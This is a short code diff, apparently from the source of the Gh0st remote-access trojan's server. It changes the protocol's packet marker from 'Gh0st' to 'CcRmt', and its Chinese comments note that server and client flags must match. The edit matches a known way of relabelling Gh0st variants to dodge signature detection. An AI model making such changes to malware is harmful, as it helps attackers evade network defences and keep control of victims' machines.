@@ -73,7 +73,7 @@ CIOCPServer::CIOCPServer()     //简单分析CIOCPServer类 套接字数据处理的类
 	m_nMaxConnections = 10000;
 	m_nKeepLiveTime = 1000 * 60 * 3; // 三分钟探测一次
 	// Packet Flag;
-	BYTE bPacketFlag[] = {'G', 'h', '0', 's', 't'};           //这里是数据发送的标记  服务端同客户端字符必须一致
+	BYTE bPacketFlag[] = {'C', 'c', 'R', 'm', 't'};           //这里是数据发送的标记  服务端同客户端字符必须一致
 	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag)); 
 }
 
